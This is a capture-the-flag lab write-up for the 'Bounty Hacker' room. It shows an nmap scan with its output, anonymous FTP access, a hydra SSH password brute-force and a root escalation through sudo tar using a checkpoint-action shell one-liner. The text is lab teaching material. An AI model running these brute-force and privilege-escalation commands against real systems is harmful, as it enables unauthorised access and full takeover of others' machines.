# Room Bounty Hacker
## You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

### Recon Phase 
</br>

```bash
nmap -sV -A -p- [ip]
```
</br>

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-13 23:28 WAT
Nmap scan report for 10.130.161.195 (10.130.161.195)
Host is up (0.15s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.169.140
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4f:47:e6:20:04:68:86:8b:37:39:17:76:13:ff:b8:7e (RSA)
|   256 86:c5:44:60:8d:73:6a:d2:5e:ac:27:c2:24:9a:3f:97 (ECDSA)
|_  256 02:5b:90:21:8d:ae:45:1b:fa:a9:e1:27:c1:83:10:96 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.37 seconds
````

</br>
</br>

### Exploitation

</br>
Note that the connection is made on the TCP port with the FTP code 230.
</br>
</br>

Let's explore the TCP port (port 21)

```bash
sudo ftp [ip]
```

We explore and manage to download two files **locks.txt** and **tasks.txt**. These two files give us important information such as the name of a user **l\*\*\*** and a short list of words resembling passwords.
</br>

Let's try a brute-force attack using the name found in the **task.txt** file on the ssh port:
</br>

```bash
hydra -l lin -P locks.txt ssh://[ip]
```

</br>

Whoaahh we have the ssh password.
</br>

```password: RedDr4********cat3```

</br>

GG, we're connected to the machine and we're doing a ```cat user.txt```

</br>
</br>

### Privilege Escalation

</br>
Let's execute the ```sudo -l``` command <br>

```bash
(root) /bin/tar
```

</br>

Then we execute the command: </br>
```bash
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
Woohoo, we're root, so a simple ```cat /root/root.txt``` and there you go.

